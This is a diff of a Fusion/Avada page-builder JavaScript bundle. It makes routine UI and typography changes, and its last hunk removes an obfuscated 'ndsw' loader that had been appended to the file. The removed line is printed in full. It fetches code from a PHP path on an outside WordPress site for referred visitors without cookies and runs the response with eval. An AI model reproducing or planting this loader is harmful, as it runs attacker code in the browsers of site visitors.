@@ -1,4 +1,4 @@
-/* global customizer, Fuse, FusionPageBuilderApp, FusionApp, FusionEvents, fusionBuilderText, fusionSanitize, fusionAppConfig */
+/* global customizer, Fuse, FusionPageBuilderApp, FusionApp, FusionEvents, fusionBuilderText, fusionSanitize, fusionAppConfig, awbPalette */
 var FusionPageBuilder = FusionPageBuilder || {};
 
 ( function() {
@@ -590,9 +590,11 @@ var FusionPageBuilder = FusionPageBuilder || {};
 		 * @return {void}
 		 */
 		resizableDrag: function() {
-			var self     = this,
-				$sidebar = this.$el.find( '#customize-controls' ),
-				handle   = this.$body.hasClass( 'sidebar-right' ) ? 'w' : 'e';
+			var self       = this,
+				$sidebar   = this.$el.find( '#customize-controls' ),
+				handle     = this.$body.hasClass( 'sidebar-right' ) ? 'w' : 'e',
+				urlParams  = new URLSearchParams( window.location.search ),
+				maxSBWidth = null !== urlParams.get( 'sb-max' ) ? parseInt( urlParams.get( 'sb-max' ) ) : 640;
 
 			// On start can sometimes be laggy/late.
 			$sidebar.hover(
@@ -608,14 +610,14 @@ var FusionPageBuilder = FusionPageBuilder || {};
 			$sidebar.resizable( {
 				handles: handle,
 				minWidth: 327,
-				maxWidth: 640,
+				maxWidth: maxSBWidth,
 				start: function() {
 					self.$body.addClass( 'fusion-preview-block' ).addClass( 'fusion-sidebar-resizing' );
 				},
 				resize: function( event, ui ) {
 					var width = ( 327 >= ui.size.width ) ? 327 : ui.size.width;
 
-					width = ( 640 < width ) ? 640 : width;
+					width = ( maxSBWidth < width ) ? maxSBWidth : width;
 
 					if ( self.$body.hasClass( 'sidebar-right' ) ) {
 						self.$previewPanel.css( 'padding-right', width ).css( 'padding-left', 0 );
@@ -626,7 +628,7 @@ var FusionPageBuilder = FusionPageBuilder || {};
 				stop: function( event, ui ) {
 					var width = ( 327 >= ui.size.width ) ? 327 : ui.size.width;
 
-					width = ( 640 < width ) ? 640 : width;
+					width = ( maxSBWidth < width ) ? maxSBWidth : width;
 
 					if ( self.$body.hasClass( 'sidebar-right' ) ) {
 						$sidebar.css( { left: 'auto', right: 0 } );
@@ -1160,7 +1162,8 @@ var FusionPageBuilder = FusionPageBuilder || {};
 		 * @return {string} - Returns the value as a string.
 		 */
 		fixToValueName: function( to, value, type, subset ) {
-			var flatTo  = this.getFlatToObject();
+			var flatTo  = this.getFlatToObject(),
+				colorObject;
 
 			if ( 'undefined' !== typeof flatTo[ to ] && 'undefined' !== typeof flatTo[ to ].choices && 'undefined' !== typeof flatTo[ to ].choices[ value ] && 'yesno' !== type ) {
 				return flatTo[ to ].choices[ value ];
@@ -1171,6 +1174,15 @@ var FusionPageBuilder = FusionPageBuilder || {};
 				} else {
 					value = _.values( value ).join( ', ' );
 				}
+			}
+
+			if ( _.isString( value ) && awbPalette.getColorSlugFromCssVar( value ) ) {
+				colorObject = awbPalette.getColorObject( awbPalette.getColorSlugFromCssVar( value ) );
+				if ( ! colorObject ) {
+					colorObject = awbPalette.getDefaultColorObject();
+				}
+
+				value = colorObject.label;
 			}
 
 			switch ( type ) {
@@ -2070,7 +2082,11 @@ var FusionPageBuilder = FusionPageBuilder || {};
 
 					// Get sub-value if we have a 3rd argument.
 					if ( _.isObject( varVal ) && ! _.isUndefined( cssVar.choice ) && ! _.isUndefined( varVal[ cssVar.choice ] ) ) {
-						varVal = varVal[ cssVar.choice ];
+						if ( ( 'font-style' === cssVar.choice || 'font-weight' === cssVar.choice ) && 'string' === typeof varVal[ 'font-family' ] && varVal[ 'font-family' ].includes( 'var(' ) ) {
+							varVal = window.awbTypographySelect.getVarString( parentValue[ 'font-family' ], cssVar.choice );
+						} else {
+							varVal = varVal[ cssVar.choice ];
+						}
 					}
 
 					// Make sure we have a pattern.
@@ -2102,7 +2118,6 @@ var FusionPageBuilder = FusionPageBuilder || {};
 					if ( 'string' === typeof cssVar.element ) {
 						selector = cssVar.element;
 					}
-
 					css += selector + '{' + cssVar.name + ':' + varVal + ';}';
 				} );
 			}
@@ -2531,7 +2546,7 @@ var FusionPageBuilder = FusionPageBuilder || {};
 		}
 	};
 }( jQuery ) );
-;/* global FusionApp, fusionBuilderTabL10n, fusionAllElements, FusionEvents, fusionBuilderText, avadaPanelIFrame */
+;/* global FusionApp, fusionBuilderTabL10n, fusionAllElements, FusionEvents, fusionBuilderText, avadaPanelIFrame, awbTypographySelect */
 /* jshint -W024 */
 /* eslint max-depth: 0 */
 var FusionPageBuilder = FusionPageBuilder || {};
@@ -2570,7 +2585,10 @@ var FusionPageBuilder = FusionPageBuilder || {};
 			'click .option-preview-toggle': 'previewToggle',
 			'click .fusion-panel-description': 'showHideDescription',
 			'click .fusion-panel-shortcut': 'defaultPreview',
-			'click .fusion-quick-option': 'quickOption'
+			'click .fusion-quick-option': 'quickOption',
+			'click .option-has-responsive': 'showResponsiveOptions',
+			'click .fusion-responsive-options li a': 'changeResponsiveOption',
+			'mouseleave .fusion-builder-option': 'hideResponsiveOptions'
 		},
 
 		/**
@@ -2751,6 +2769,7 @@ var FusionPageBuilder = FusionPageBuilder || {};
 			this.optionMultiUpload( $thisEl );
 			this.optionCodeBlock( $thisEl );
 			this.optionTypography( $thisEl );
+			this.optionTypographySets( $thisEl );
 			this.optionSwitch( $thisEl );
 			this.optionImport( $thisEl );
 			this.optionExport( $thisEl );
@@ -2759,7 +2778,9 @@ var FusionPageBuilder = FusionPageBuilder || {};
 			this.optionRaw( $thisEl );
 			this.optionLinkSelector( $thisEl );
 			this.optionHubSpotMap( $thisEl );
+			this.optionMailchimpMap( $thisEl );
 			this.optionIconpicker( $thisEl );
+			this.optionLayoutConditions( $thisEl );
 
 			if ( 'undefined' === typeof $element ) {
 				this.optionRepeater( this.type );
@@ -2774,16 +2795,20 @@ var FusionPageBuilder = FusionPageBuilder || {};
 		 * @return {void}
 		 */
 		needsDebounce: function( event ) {
-			var option = jQuery( event.currentTarget ).closest( '.fusion-builder-option' ),
-				id      = option.data( 'option-id' ),
-				fields  = this.model.get( 'fields' ),
-				field   = fields[ id ];
+			var option     = jQuery( event.currentTarget ).closest( '.fusion-builder-option' ),
+				id         = option.data( 'option-id' ),
+				fields     = this.model.get( 'fields' ),
+				field      = fields[ id ],
+				debouncers = [ 'primary_color' ];
 
 			if ( 'undefined' === typeof field && option.parent().hasClass( 'repeater-fields' ) ) {
-				id = option.parent().closest( '.fusion-builder-option' ).data( 'option-id' );
-				field   = fields[ id ];
+				id    = option.parent().closest( '.fusion-builder-option' ).data( 'option-id' );
+				field = fields[ id ];
 			}
 
+			if ( debouncers.includes( id ) ) {
+				return true;
+			}
 			if ( 'undefined' !== typeof field && ( 'undefined' !== typeof field.output || 'undefined' !== typeof field.css_vars || ( 'undefined' !== typeof field.transport && 'postMessage' === field.transport ) ) ) {
 				return false;
 			}
@@ -2906,6 +2931,9 @@ var FusionPageBuilder = FusionPageBuilder || {};
 		 * @return {void}
 		 */
 		needsUpdate: function( $target, value, id, save ) {
+			var parts,
+				base,
+				optionName;
 
 			// If value hasn't changed.
 			if ( value === save[ id ] ) {
@@ -2942,11 +2970,38 @@ var FusionPageBuilder = FusionPageBuilder || {};
 				return false;
 			}
 
-			if ( _.isObject( save[ id ] ) && (
-				$target.parents( '.fusion-builder-dimension' ).length ||
-				$target.parents( '.fusion-builder-typography' ).length
-			) && value === save[ id ][ $target.attr( 'name' ) ] ) {
+			if ( _.isObject( save[ id ] ) && $target.parents( '.fusion-builder-dimension' ).length && value === save[ id ][ $target.attr( 'name' ) ] ) {
 				return false;
+			}
+
+			if ( _.isObject( save[ id ] ) && ( $target.closest( '.fusion-builder-option.typography' ).length || $target.closest( '.fusion-builder-option.typography-sets' ).length ) ) {
+
+				if ( -1 !== $target.attr( 'name' ).indexOf( '[' ) ) {
+
+					// Split the key in parts.
+					parts = $target.attr( 'name' ).split( '[' );
+
+					// Set the option base.
+					base = save[ parts.shift().replace( ']', '' ) ];
+
+					optionName = parts.pop().replace( ']', '' );
+
+					// if we still have extra parts, add them.
+					if ( parts.length ) {
+						_.each( parts, function( part ) {
+							part = part.replace( ']', '' );
+
+							if ( 'undefined' === typeof base[ part ] ) {
+								base[ part ] = {};
+							}
+							base = base[ part ];
+						} );
+					}
+				}
+
+				if ( 'undefined' !== typeof base[ optionName ] &&  value === base[ optionName ] ) {
+					return false;
+				}
 			}
 
 			return true;
@@ -2964,47 +3019,59 @@ var FusionPageBuilder = FusionPageBuilder || {};
 		 * @return {void}
 		 */
 		saveChange: function( $target, value, id, save, type ) {
-			var parts;
+			var parts,
+				base,
+				optionName;
 
 			// Update the settings object.
-			if ( ( _.isObject( save[ id ] ) || _.isUndefined( save[ id ] ) ) && (
+			if ( $target.closest( '.fusion-builder-option' ).hasClass( 'typography' ) || $target.closest( '.fusion-builder-option' ).hasClass( 'typography-sets' ) || (
+				( _.isObject( save[ id ] ) || _.isUndefined( save[ id ] ) ) && (
 				$target.parents( '.fusion-builder-dimension' ).length ||
-				$target.parents( '.fusion-builder-typography' ).length ||
 				$target.parents( '.fusion-builder-repeater' ).length
-			) ) {
+			) ) ) {
 
 				if ( _.isUndefined( save[ id ] ) ) {
 					save[ id ] = {};
 				}
 
-				if ( 'variant' === $target.attr( 'name' ) ) {
-					if ( save[ id ][ 'font-weight' ] === this.getFontWeightFromVariant( value ) && save[ id ][ 'font-style' ] === this.getFontStyleFromVariant( value ) ) {
-
-						// Same variant, exit.
-						return;
-					}
-
-					// New variant, update style and weight then continue.
-					save[ id ].variant        = value;
-					save[ id ][ 'font-weight' ] = this.getFontWeightFromVariant( value );
-					save[ id ][ 'font-style' ]  = this.getFontStyleFromVariant( value );
-
-				} else if ( -1 !== $target.attr( 'name' ).indexOf( '[' ) ) {
+				if ( -1 !== $target.attr( 'name' ).indexOf( '[' ) ) {
 
 					// Split the key in parts.
 					parts = $target.attr( 'name' ).split( '[' );
 
-					// Remove unwanted characters.
-					parts[ 0 ] = parts[ 0 ].replace( ']', '' );
-					parts[ 1 ] = parts[ 1 ].replace( ']', '' );
+					// Set the option base.
+					base = save[ parts.shift().replace( ']', '' ) ];
 
-					save[ parts[ 0 ] ] = save[ parts[ 0 ] ] || {};
-					save[ parts[ 0 ] ][ parts[ 1 ] ] = value;
+					// Se the final option name.
+					optionName = parts.pop().replace( ']', '' );
+
+					// if we still have extra parts, add them.
+					if ( parts.length ) {
+						_.each( parts, function( part ) {
+							part = part.replace( ']', '' );
+
+							if ( 'undefined' === typeof base[ part ] ) {
+								base[ part ] = {};
+							}
+							base = base[ part ];
+						} );
+					}
+
+					if ( 'variant' === optionName ) {
+						if ( base[ 'font-weight' ] === awbTypographySelect.getFontWeightFromVariant( value ) && base[ 'font-style' ] === awbTypographySelect.getFontStyleFromVariant( value ) ) {
+							return;
+						}
+						base.variant = value;
+						base[ 'font-weight' ] = awbTypographySelect.getFontWeightFromVariant( value );
+						base[ 'font-style' ]  = awbTypographySelect.getFontStyleFromVariant( value );
+					} else {
+						base[ optionName ] = value;
+					}
 				} else {
 					save[ id ][ $target.attr( 'name' ) ] = value;
 				}
 
-			} else if ( $target.hasClass( 'fusion-image-as-object' ) ) {
+			} else if ( $target.hasClass( 'fusion-image-as-object' ) || $target.hasClass( 'awb-palette-save' ) ) {
 				value = JSON.parse( value );
 				save[ id ] = value;
 			} else {
@@ -3450,10 +3517,19 @@ var FusionPageBuilder = FusionPageBuilder || {};
 				valid     = true,
 				message   = '';
 
+			if ( $target.hasClass( 'awb-ignore' ) ) {
+				return;
+			}
+
 			if ( 'checkbox' === ( $target ).attr( 'type' ) ) {
 				value = $target.is( ':checked' ) ? '1' : '0';
 			}
 
+			// Do not validate variable within value.
+			if ( 'string' === typeof value && -1 !== value.indexOf( 'var(' ) ) {
+				FusionApp.validate.message( 'remove', id, $target );
+				return true;
+			}
 			if ( $optionEl.hasClass( 'spacing' ) || $optionEl.hasClass( 'dimension' ) ) {
 				valid   = FusionApp.validate.cssValue( value );
 				message = fusionBuilderTabL10n.invalidCssValue;
@@ -3479,6 +3555,42 @@ var FusionPageBuilder = FusionPageBuilder || {};
 			}
 			FusionApp.validate.message( 'remove', id, $target );
 			return true;
+		},
+
+		/**
+		 * Show responsive options.
+		 *
+		 * @param {Object} event
+		 */
+		showResponsiveOptions: function( event ) {
+			var $element = jQuery( event.currentTarget ).parent();
+
+			$element.toggleClass( 'active-item' );
+		},
+
+		/**
+		 * Change responsive option.
+		 *
+		 * @param {Object} event
+		 */
+		changeResponsiveOption: function( event ) {
+			var $element   = jQuery( event.currentTarget );
+			var $parent    = jQuery( event.currentTarget ).closest( 'li.active-item' );
+
+			jQuery( '.fusion-builder-preview-' + $element.data( 'indicator' ) ).trigger( 'click' );
+			$parent.removeClass( 'active-item' );
+
+		},
+
+		/**
+		 * Hide responsive option.
+		 *
+		 * @param {Object} event
+		 */
+		hideResponsiveOptions: function( event ) {
+			var $element   = jQuery( event.currentTarget );
+
+			$element.find( '.fusion-panel-options li.active-item' ).removeClass( 'active-item' );
 		},
 
 		/**
@@ -3548,6 +3660,7 @@ var FusionPageBuilder = FusionPageBuilder || {};
 
 	// Options
 	_.extend( FusionPageBuilder.TabView.prototype, FusionPageBuilder.options.fusionTypographyField );
+	_.extend( FusionPageBuilder.TabView.prototype, FusionPageBuilder.options.fusionTypographySetsField );
 	_.extend( FusionPageBuilder.TabView.prototype, FusionPageBuilder.options.fusionCodeBlock );
 	_.extend( FusionPageBuilder.TabView.prototype, FusionPageBuilder.options.fusionColorPicker );
 	_.extend( FusionPageBuilder.TabView.prototype, FusionPageBuilder.options.fusionDimensionField );
@@ -3567,7 +3680,9 @@ var FusionPageBuilder = FusionPageBuilder || {};
 	_.extend( FusionPageBuilder.TabView.prototype, FusionPageBuilder.options.fusionRawField );
 	_.extend( FusionPageBuilder.TabView.prototype, FusionPageBuilder.options.fusionLinkSelector );
 	_.extend( FusionPageBuilder.TabView.prototype, FusionPageBuilder.options.fusionHubSpotMap );
+	_.extend( FusionPageBuilder.TabView.prototype, FusionPageBuilder.options.fusionMailchimpMap );
 	_.extend( FusionPageBuilder.TabView.prototype, FusionPageBuilder.options.fusionIconPicker );
+	_.extend( FusionPageBuilder.TabView.prototype, FusionPageBuilder.options.fusionLayoutConditions );
 
 	// Active states.
 	_.extend( FusionPageBuilder.TabView.prototype, FusionPageBuilder.fusionActiveStates );
@@ -3581,7 +3696,7 @@ var FusionPageBuilder = FusionPageBuilder || {};
 	_.extend( FusionPageBuilder.Callback.prototype, {
 
 		fusion_get_alpha: function( value ) {
-			var color = jQuery.Color( value );
+			var color = jQuery.AWB_Color( value );
 			return color.alpha();
 		},
 
@@ -3602,6 +3717,9 @@ var FusionPageBuilder = FusionPageBuilder || {};
 			}
 			if ( '0' != FusionApp.settings.sharing_whatsapp ) {
 				socialMedia.push( 'whatsapp' );
+			}
+			if ( '0' != FusionApp.settings.sharing_telegram ) {
+				socialMedia.push( 'telegram' );
 			}
 			if ( '0' != FusionApp.settings.sharing_tumblr ) {
 				socialMedia.push( 'tumblr' );
@@ -3749,4 +3867,3 @@ var FusionPageBuilder = FusionPageBuilder || {};
 		}
 	} );
 }( jQuery ) );
-;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
